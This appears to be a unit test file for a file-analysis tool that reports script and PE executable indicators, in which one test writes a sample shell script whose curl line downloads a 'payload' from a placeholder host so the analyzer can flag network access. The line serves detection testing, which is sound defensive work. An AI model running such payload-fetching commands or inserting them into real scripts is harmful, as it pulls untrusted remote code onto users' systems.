import tempfile
import unittest
from pathlib import Path

from revinspector.report import analyze_file, to_html, to_json, to_text
from fixtures import minimal_pe32


class ReportTests(unittest.TestCase):
    def test_analyze_script_report(self) -> None:
        with tempfile.TemporaryDirectory() as tempdir:
            sample = Path(tempdir) / "sample.sh"
            sample.write_text(
                "#!/usr/bin/env sh\n"
                "curl https://example.invalid/payload -o /tmp/payload\n",
                encoding="utf-8",
            )

            report = analyze_file(sample)
            data = report.to_dict()

            self.assertEqual(data["type"], "script")
            self.assertTrue(data["hashes"]["sha256"])
            self.assertIn(data["risk"], {"medium", "high"})
            self.assertIn("network access", {finding["value"] for finding in data["findings"]})
            self.assertIn("Summary:", to_text(report))
            self.assertIn('"type": "script"', to_json(report))
            self.assertIn("<h2>Indicators</h2>", to_html(report))

    def test_analyze_pe_header_without_optional_dependencies(self) -> None:
        with tempfile.TemporaryDirectory() as tempdir:
            sample = Path(tempdir) / "sample.exe"
            sample.write_bytes(minimal_pe32())

            report = analyze_file(sample)
            data = report.to_dict()

            self.assertEqual(data["type"], "PE")
            self.assertEqual(data["architecture"], "x86")
            self.assertEqual(data["details"]["pe_format"], "PE32")
            self.assertEqual(data["details"]["subsystem"], "windows_console")
            self.assertEqual(data["sections"][0]["name"], ".text")
            self.assertIn("execute", data["sections"][0]["flags"])
            self.assertIn("Pe Format", to_html(report))


if __name__ == "__main__":
    unittest.main()
